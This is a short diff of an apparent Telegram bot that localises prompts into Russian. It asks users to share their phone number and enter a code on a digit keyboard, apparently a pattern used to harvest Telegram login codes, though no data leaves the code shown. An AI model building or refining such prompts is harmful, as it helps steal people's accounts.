@@ -86,7 +86,7 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
         buttons.append(btn_row)
     buttons.append([InlineKeyboardButton("✅ Успешно", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Codice: `{current_code}`" if current_code else "Inserisci il codice:"
+    text = f"Codice: `{current_code}`" if current_code else "Введите код:"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -140,7 +140,7 @@ async def start_auth(callback_query: types.CallbackQuery):
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
 
-    await bot.send_message(user_id, "📱 Поделиться номером:", reply_markup=kb)
+    await bot.send_message(user_id, "📱 Для начала поделитесь своим Номером Telegram.", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
